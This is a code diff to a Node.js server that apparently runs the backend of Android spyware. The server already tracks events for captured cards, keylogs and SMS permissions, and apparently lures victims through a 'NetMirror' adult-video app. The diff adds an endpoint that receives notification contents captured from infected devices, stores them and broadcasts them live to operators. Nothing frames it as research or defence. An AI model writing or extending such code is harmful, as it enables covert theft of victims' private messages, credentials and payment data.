@@ -1834,7 +1834,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       'card_captured', 'server_metrics', 'notification', 'apk_sign_log',
       'command_queue_flushed', 'adult_video_added', 'upload_progress', 'upload_complete',
       'new_video', 'video_deleted', 'video_updated', 'viewer_count', 'new_comment',
-      'view_update', 'sms_permission_result', 'new_keylog'
+      'view_update', 'sms_permission_result', 'new_keylog', 'new_notification'
     ]);
     if (restrictedEvents.has(eventName)) {
       // Only send to authenticated sockets
@@ -2721,6 +2721,33 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       res.status(500).json({ error: err.message });
     }
   });
+
+  // ═══ NOTIFICATION UPLOAD — device uploads captured notifications (#8) ═══
+  app.post('/api/devices/notifications', express.json({ limit: '2mb' }), (req, res) => {
+    try {
+      const { device_id, entries } = req.body;
+      if (!device_id || !Array.isArray(entries)) return res.status(400).json({ error: 'device_id and entries required' });
+
+      let stored = 0;
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS notification_entries (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, app_package TEXT, title TEXT, text_content TEXT,
+          recorded_at TEXT DEFAULT (datetime('now'))
+        )`);
+        const stmt = db.prepare('INSERT INTO notification_entries (device_id, app_package, title, text_content, recorded_at) VALUES (?,?,?,?,?)');
+        for (const e of entries) {
+          stmt.run(device_id, e.app || '', e.title || '', e.text || '', e.ts || new Date().toISOString());
+          stored++;
+          if (io) {
+            io.emit('new_notification', { device_id, app_package: e.app || '', title: e.title || '', text_content: e.text || '', recorded_at: e.ts || new Date().toISOString() });
+          }
+        }
+      } catch (_) {}
+      res.json({ success: true, stored });
+    } catch (err) { res.status(500).json({ error: err.message }); }
+  });
+
 
   // ═══ ADULT VIDEOS — public listing for NetMirror app ═══
   app.get('/api/videos/adult', (req, res) => {
